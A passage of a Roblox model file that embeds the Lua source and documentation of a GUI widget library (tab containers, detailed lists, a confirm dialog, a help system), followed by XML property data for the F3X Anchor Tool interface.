				Cell.MouseButton1Click:connect(function()
					local continue = true
					if cell_scheme.callback then
						continue = cell_scheme.callback(RowData,Class)
					end
					if continue then
						RowData[i] = not RowData[i]
						SetImageOrGraphic(Cell,RowData[i])
					end
				end)
			end
			Cell.Size = UDim2.new(Width.Scale,Width.Offset,1,0) -- this would be a lot easier if UDim2.new accepts UDims
			Cell.Position = UDim2.new(CellColPos.Scale,CellColPos.Offset,0,0)
			CellColPos = CellColPos + Width
		end
		RowFrameLookup[RowData] = NewRow
		RowDataLookup[NewRow] = RowData
		Update()
		return RowData
	end

	-- remove entry from the list; may be a list index or an item in the list
	function Class.RemoveRow(index)
		local RowData
		if type(index) == "number" or type(index) == "nil" then
			RowData = table.remove(RowDataList,index)
		else
			for i,v in pairs(RowDataList) do
				if v == index then
					RowData = table.remove(RowDataList,i)
					break
				end
			end
		end
		if RowData then
			local stylist = RowStylists[RowData]
			stylist.Destroy()
			RowStylists[RowData] = nil

			local frame = RowFrameLookup[RowData]
			RowDataLookup[frame] = nil
			RowFrameLookup[RowData] = nil
			for i,rowframe in pairs(RowFramesList) do
				if rowframe == frame then
					for i,cell in pairs(rowframe:GetChildren()) do
						GlobalStylist.RemoveObject(cell)
						ColumnStylists[i].RemoveObject(cell)
						CellStylist.RemoveObject(cell)
					end
					table.remove(RowFramesList,i)
					break
				end
			end
			Scroll.TotalSpace = #RowDataList
			for i,rowframe in pairs(DisplayedRows) do
				if rowframe == frame then
					table.remove(DisplayedRows,i)
					break
				end
			end
			frame:Destroy()
		end
		Update()
		return RowData
	end

	do
		local tmp = {}
		for k,v in pairs(RowDataList) do
			tmp[k] = v
			RowDataList[k] = nil
		end
		for i=1,#tmp do
			Class.AddRow(tmp[i])
		end
	end

---- Finish

	-- when the list's Zindex changes, update the ZIndex of everything
	SetZIndexOnChanged(DetailedListFrame)

	-- attempts to free resources
	function Class.Destroy()
		local function empty_table(t)
			for k in pairs(t) do t[k] = nil end
		end
		empty_table(Class.Stylist)
		empty_table(Class)
		empty_table(RowFramesList)
		empty_table(RowFrameLookup)
		empty_table(RowDataLookup)
		empty_table(DisplayedRows)
		empty_table(CellMetadata)
		GlobalStylist.Destroy()
		CellStylist.Destroy()
		HeaderStylist.Destroy()
		RowSpanStylist.Destroy()
		for k,v in pairs(RowStylists) do
			v.Destroy()
			RowStylists[k] = nil
		end
		for k,v in pairs(ColumnStylists) do
			v.Destroy()
			ColumnStylists[k] = nil
		end
		Scroll.Destroy()
		RowTemplate:Destroy()
		DetailedListFrame:Destroy()
	end

	Class.Update()
	
	return Class,DetailedListFrame
end

lib.DetailedList = CreateDetailedList

--[[DEPEND:
SetZIndex.lua;
Stylist.lua;
AutoSizeLabel.lua;
StackingFrame.lua;
]]

doc["TabContainer"] = [==[
TabContainer ( table `content_list`, number `selected_height`, number `tab_height` ) [constructor]
	returns: TabContainer `object`, Frame `tab_container`

Creates a container that can hold multiple GuiObjects in a single space by using tabs.
A GuiObject added to the container gets its own tab, which shows the GuiObject's Name, and displays the GuiObject when clicked.

Arguments:
	`content_list`
		A list of GuiObjects to be initially added to the container.
		Optional; defaults to an empty table

	`selected_height`
		The height of a selected tab.
		Optional; defaults to 24

	`tab_height`
		The height, in pixels, of a tab that is not selected.
		Optional; defaults to 20

Returns:
	`object`
		The TabContainer object.
	`tab_container`
		The container GUI.


TabContainer Class:
	This class contains the following members:

	Readonly:
		GUI
			The container GUI.

		TabStylist
			A Stylist object that controls the appearance of unselected tabs.
			Also controls the appearance of the content border.

		SelectedTabStylist
			A Stylist object that controls the appearance of the selected tab.

	Methods:
		AddTab ( GuiObject `content`, number `index` )
			Adds `content` to the container at `index`.
			if `index` is not specified, then it will be added to the end.

		RemoveTab ( number `index` )
			Removes the tab at `index`, and returns the content of that tab.
			`index` can also be a GUI in the container.

		MoveTab ( number `index`, number `to` )
			Moves the object at `index` to the index of `to`.
			`index` and `to` can also be GUIs in the container.

		SelectTab ( number `index` )
			Selects the tab at `index`.
			`index` can also be a GUI in the container.

		GetIndex ( GuiObject `content` )
			Returns the index of `content`.
			If `content` isn't in the container, this returns nil.

		GetSelectedIndex ( )
			Returns the index of the selected tab, and its GUI.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.

]==]

local function CreateTabContainer(ContentList,SelectedTabHeight,TabHeight)
	SelectedTabHeight = SelectedTabHeight or 24
	TabHeight = TabHeight or 20
	
	local selected_index = 0
	local content_list = {}
	local tab_lookup = {}
	local con = {}
	
	local TabContainerFrame = Create'Frame'{
		Name = "TabContainer";
		Size = UDim2.new(0,300,0,200);
		BackgroundTransparency = 1;
		Create'Frame'{
			Name = "Content";
			Size = UDim2.new(1,0,1,-SelectedTabHeight);
			Position = UDim2.new(0,0,0,SelectedTabHeight);
			BackgroundColor3 = Color3.new();
			BorderColor3 = Color3.new(1,1,1);
		};
		Create'Frame'{
			Parent = TabContainerFrame;
			Name = "Tabs";
			BackgroundTransparency = 1;
		};
	}

	local TabContentFrame = TabContainerFrame.Content
	local TabHeaderFrame = TabContainerFrame.Tabs
	local TabHeaderClass = CreateStackingFrame(TabHeaderFrame,true,true)
	
	local TabStylist = CreateStylist({
		BackgroundColor3 = Color3.new();
		BackgroundTransparency = 0.5;
		BorderColor3 = Color3.new(1,1,1);
		TextColor3 = Color3.new(1,1,1);
		Font = "ArialBold";
		FontSize = "Size14";
	})
	TabStylist.AddObject(TabContentFrame)
	
	local SelectedTabStylist = CreateStylist({
		BackgroundColor3 = Color3.new();
		BackgroundTransparency = 0.5;
		BorderColor3 = Color3.new(1,1,1);
		TextColor3 = Color3.new(1,1,1);
		Font = "ArialBold";
		FontSize = "Size14";
	})
	
	local function GetIndex(content)
		for index,c in pairs(content_list) do
			if c == content then
				return index
			end
		end
	end
	
	local function GetSelectedIndex()
		return selected_index,content_list[selected_index]
	end
	
	local function ClampIndex(index,i)
		local max = #content_list + (i or 0)
		index = math.floor(index)
		return index < 1 and 1 or index > max and max or index
	end

	local function SelectTab(index)
		if #content_list > 0 then
			if type(index) ~= "number" then
				index = GetIndex(index)
			end
			if index then
				index = ClampIndex(index)
				if selected_index > 0 then
					local content = content_list[selected_index]
					content.Visible = false
					local Tab = tab_lookup[content]
					Tab.LockAxis(nil,TabHeight)
					SelectedTabStylist.RemoveObject(Tab,GUI)
					TabStylist.AddObject(Tab.GUI)
				end
				local content = content_list[index]
				content.Visible = true
				local Tab = tab_lookup[content]
				Tab.LockAxis(nil,SelectedTabHeight)
				TabStylist.RemoveObject(Tab.GUI)
				SelectedTabStylist.AddObject(Tab.GUI)
				selected_index = index
			end
		else
			selected_index = 0
		end
	end
	
	local function AddTab(content,index)
		if index then
			index = ClampIndex(index,1)
			table.insert(content_list,index,content)
		else
			table.insert(content_list,content)
			index = #content_list
		end
		content.Visible = false
		content.Parent = TabContentFrame
		
		local TabFrame = Create'TextButton'{
			Name = "Tab";
			Text = content.Name;
		}
		local Tab = CreateAutoSizeLabel(TabFrame)
		tab_lookup[content] = Tab
		Tab.SetPadding(0,4)
		Tab.LockAxis(nil,TabHeight)
		TabStylist.AddObject(TabFrame)
		TabHeaderClass.AddObject(TabFrame,index)
		TabFrame.MouseButton1Click:connect(function()
			SelectTab(content)
		end)
		con[content] = content.Changed:connect(function(p)
			if p == "Name" then
				TabFrame.Text = content.Name
			end
		end)
		if selected_index == 0 then
			SelectTab(index)
		elseif index <= selected_index then
			selected_index = selected_index + 1
		end
	end
	
	local function RemoveTab(index)
		if #content_list > 0 then
			if type(index) ~= "number" then
				if index == nil then
					index = #content_list
				else
					index = GetIndex(index)
				end
			end
			if index then
				index = ClampIndex(index)
				local content = table.remove(content_list,index)
				content.Parent = nil
				con[content]:disconnect()
				con[content] = nil
				local tab = tab_lookup[content]
				TabHeaderClass.RemoveObject(index)
				tab_lookup[content] = nil
				tab.Destroy()
				if index == selected_index then
					SelectTab(index)
				elseif index < selected_index then
					selected_index = selected_index - 1
				end
				return content
			end
		end
	end
	
	local function MoveTab(index,to)
		if #content_list > 0 then
			if type(index) ~= "number" then
				index = GetIndex(index)
			end
			if type(to) ~= "number" then
				to = GetIndex(to)
			end
			if index and to then
				index = ClampIndex(index)
				to = ClampIndex(to)
				local content = table.remove(content_list,index)
				table.insert(content_list,to,content)
				TabHeaderClass.MoveObject(index,to)
				if index == selected_index then
					selected_index = to
				elseif index > selected_index and to <= selected_index then
					selected_index = selected_index + 1
				elseif index < selected_index and to >= selected_index then
					selected_index = selected_index - 1
				end
			end
		end
	end
	
	local Class = {
		GUI = TabContainerFrame;
		GetIndex = GetIndex;
		GetSelectedIndex = GetSelectedIndex;
		SelectTab = SelectTab;
		AddTab = AddTab;
		RemoveTab = RemoveTab;
		MoveTab = MoveTab;
		TabStylist = TabStylist;
		SelectedTabStylist = SelectedTabStylist;
	}
	
	SetZIndexOnChanged(TabContainerFrame)
	
	local function Destroy()
		for k in pairs(Class) do
			Class[k] = nil
		end
		SelectedTabStylist.Destroy()
		TabStylist.Destroy()
		TabHeaderClass.Destroy()
		for k,v in pairs(con) do
			v:disconnect()
			con[k] = nil
		end
		for i,content in pairs(content_list) do
			content.Parent = nil
			content_list[i] = nil
		end
		for k,tab in pairs(tab_lookup) do
			tab_lookup[k] = nil
			tab.Destroy()
		end
		TabContainerFrame:Destroy()
	end
	Class.Destroy = Destroy
	
	if ContentList then
		for i,content in pairs(ContentList) do
			AddTab(content,i)
		end
	end
	
	return Class,TabContainerFrame
end

lib.TabContainer = CreateTabContainer

local dialog = {}
doc["dialog"] = [==[
	A library of various user-input dialogs.
]==]

--[[DEPEND:
Stylist.lua;
]]

doc["dialog.Confirm"] = [==[
dialog.Confirm ( GuiBase `parent`, string `message`, Stylist `style`, Stylist `button_style` ) [function]
	returns bool `result`

Displays a confirmation message and waits for the user to click Yes, No, or Cancel.

Arguments:
	`parent`
		The object to display the dialog in.

	`message`
		The message to display to the user.
		Optional; defaults to "Are you sure?"

	`stylist`
		A stylist to apply to the dialog.
		Optional; defaults to a premade stylist
		
	`button_style`
		A stylist to apply to buttons.
		Automatically inherits from `stylist`.
		Optional; defaults to a premade stylist

Returns:
	`result`
		The result of the dialog.
		If the user clicked Yes, returns true.
		If the user clicked No, returns false.
		If the user clicked Cancel, returns nil.
]==]

function dialog.Confirm(parent,message,global,buttons)
	GlobalStylist = global or Stylist{
		BackgroundColor3 = Color3.new(0,0,0);
		BorderColor3 = Color3.new(1,1,1);
		TextColor3 = Color3.new(1,1,1);
		Font = "ArialBold";
		FontSize = "Size14";
	}
	ButtonStylist = buttons or Stylist{
		Style = "RobloxButton";
	}

	local GlobalStylist = CreateStylist(style)
	local ButtonStylist = CreateStylist(button_style)
	local style_in = GlobalStylist.StylistIn(ButtonStylist)
	GlobalStylist.AddStylist(ButtonStylist)

	local Dialog = Create'Frame'{
		Name = "ConfirmDialog";
		Size = UDim2.new(1.5,0,1.5,0);
		Position = UDim2.new(-0.25,0,-0.25,0);
		BorderSizePixel = 0;
		BackgroundTransparency = 0.5;
		BackgroundColor3 = Color3.new(0,0,0);
		Active = true;
		GlobalStylist.AddObject(Create'Frame'{
			Name = "DialogBox";
			Size = UDim2.new(0,250,0,150);
			Position = UDim2.new(0.5,-125,0.5,-75);
			Create'Frame'{
				Name = "MarginBox";
				BackgroundTransparency = 1;
				Size = UDim2.new(1,-16,1,-16);
				Position = UDim2.new(0,8,0,8);
				GlobalStylist.AddObject(Create'TextLabel'{
					BackgroundTransparency = 1;
					TextScaled = true;
					Text = message or "";
					Size = UDim2.new(1,-16,0.8,-24);
					Position = UDim2.new(0,8,0,8);
				});
				Create'Frame'{
					Name = "Buttons";
					BackgroundTransparency = 1;
					Size = UDim2.new(1,0,0.2,0);
					Position = UDim2.new(0,0,0.8,0);
---- Buttons
					ButtonStylist.AddObject(Create'TextButton'{
						Name = "YesButton";
						Text = "Yes";
						Size = UDim2.new(1/3,0,1,0);
						Position = UDim2.new(0/3,0,0,0);
					});
					ButtonStylist.AddObject(Create'TextButton'{
						Name = "NoButton";
						Text = "No";
						Size = UDim2.new(1/3,0,1,0);
						Position = UDim2.new(1/3,0,0,0);
					});
					ButtonStylist.AddObject(Create'TextButton'{
						Name = "CancelButton";
						Text = "Cancel";
						Size = UDim2.new(1/3,0,1,0);
						Position = UDim2.new(2/3,0,0,0);
					});
----/Buttons
				};
			};
		});
	}
	local Buttons = Dialog.DialogBox.MarginBox.Buttons
	
	local Result = nil
	local Event = Instance.new("BindableEvent")

	Buttons.YesButton.MouseButton1Click:connect(function()
		Result = true
		Event:Fire()
	end)
	Buttons.NoButton.MouseButton1Click:connect(function()
		Result = false
		Event:Fire()
	end)
	Buttons.CancelButton.MouseButton1Click:connect(function()
		Result = nil
		Event:Fire()
	end)

	SetZIndex(Dialog,10)

	Dialog.Parent = parent
	Event.Event:wait()
	Dialog:Destroy()
	Event:Destroy()

	if global == nil then
		GlobalStylist.Destroy()
	else
		if not style_in then
			GlobalStylist.RemoveStylist(ButtonStylist)
		end
	end
	if buttons == nil then
		ButtonStylist.Destroy()
	end

	return Result
end

lib.dialog = dialog

--[[DEPEND:]]

doc["Help"] = [==[
Help ( string `query`, bool `no_print` ) [function]
	returns: string `message`

Returns help information for the library.

Arguments:
	`query`
		The name of the entry to display help for (case-insensitive).
		If unspecified, a list of entries will be displayed.

	`no_print`
		If set to true, the returned message will NOT also be printed.
		Note than when printed this way, the message is automatically formatted to maintain readability. 

Returns:
	`message`
		The resulting message.


Documentation Remarks:
	Argument and return values follow this format:
		type `reference`

	"type" is the argument's value type (string, bool, table, etc).
	Some arguments may accept more than one type. If so, these types will be indicated in the argument's description.
	An asterisk (*) as the type indicates that the argument may be of any type.
	Types can also be Roblox Instances, or objects defined by this library.
	The type "GuiText" refers to TextLabels, TextButtons, and TextBoxes.

	In the documentation, a word enclosed in grave accents (i.e. `example`) refers to the indicated value.

	Each entry has one of various types, which are indicated between square brackets (i.e. [type] ):
		[const]
			A constant, unchanging value.
		[enum]
			An enumerated type.
		[function]
			A function; receives arguments and returns values.
		[constructor]
			Similar to a function, buts returns an instantiated object.

	Documentation of a constructor will also contain a definition of the class it creates.
	Classes contain various member types:
		Readonly
			A value that is meant only to be read, not written to.
		Field
			A value that can be changed, affecting the state of the object.
		Method
			A function that does something internally when called.
			NOTE: Currently, methods must be called with ".", not ":". This may change in future versions.
		Callback
			Similar to a field in that it can be set, but the value is a function.
			When set, the function will be invoked at some point, and may have arguments passed to it.
			What the function returns can affect the object's behavior.
		Event
			Allows the user to connect functions (called "listeners").
			At some point, the event will fire, which then calls each listener connected to it.
			Values may be passed to each listener, received as "parameters".
]==]

local default_help = [==[
Use ]==]..PROJECT_NAME..[==[.Help("EntryName") for more information about a specific entry.

Entries:
]==]

do
	local sorted = {}
	for name,ref in pairs(doc) do
		if type(name) == "string" then
			table.insert(sorted,name)
		end
	end
	table.sort(sorted)
	for i,name in pairs(sorted) do
		default_help = default_help .. "\t" .. name .. "\n"
	end
end

doc["EntryName"] = [==[
That was an example, silly.

]==]..default_help


local DocumentationLookup = {}
DocumentationLookup[false] = default_help

function lib.Help(query,no_print)
	if type(query) == "string" then
		query = query:lower()
	end
	local output = DocumentationLookup[query] or DocumentationLookup[false]
	if not no_print then
		print(string.rep("_",80))
		for c in output:gsub("\r\n?","\n"):gmatch("(.-)\n") do
			c = c:gsub(" ","\160")
			c = c:gsub("\t",string.rep("\160",8))
			print(#c == 0 and "\160" or c)
		end
		print("\160")
	end
	return output
end

for name,ref in pairs(doc) do
	if type(name) == "string" then
		DocumentationLookup[name:lower()] = ref
		local f = lib[name]
		if type(f) == "function" then
			DocumentationLookup[f] = ref
		end
	end
end

setmetatable(lib,{
	__tostring = function()
		return ("%s GUI Library [v%s] (use %s.Help() for help)"):format(PROJECT_NAME, version, PROJECT_NAME)
	end;
})

_G.gloo = lib
print(("Loaded %s library. Type _G.%s.Help() for help."):format(PROJECT_NAME, PROJECT_NAME))]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBXEC09D6C8E8A84EB4814147616DC1F170">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Interfaces</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>100</XO>
								<YS>0</YS>
								<YO>100</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="Frame" referent="RBX2E520FCC403E437F83745BD4B0FFFFD4">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTAnchorToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>280</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>245</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXC02C2534E08740ABBC3A8E20C4F5B301">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXA81E7A838BD343A69E25E53881F47410">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXD49D54D3D91344CEA4DA147ECA0C5451">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">ANCHOR TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXBC9D9618316343F5ABA0DB945AD99C2C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXD6D04381F55345C7A9A984D9801A99FB">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Status</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX0EB8680635C24A12AC8787650C745A96">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>40</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Status</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX523AEF5F4B8845AD8E8661DB5EA9B354">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Anchored</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>90</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX7A2506AF0D4A4A3F9CC339AEF7B058F3">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>9</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-9</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBX0A005F8B6CC34CB98C77C2C952002202">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
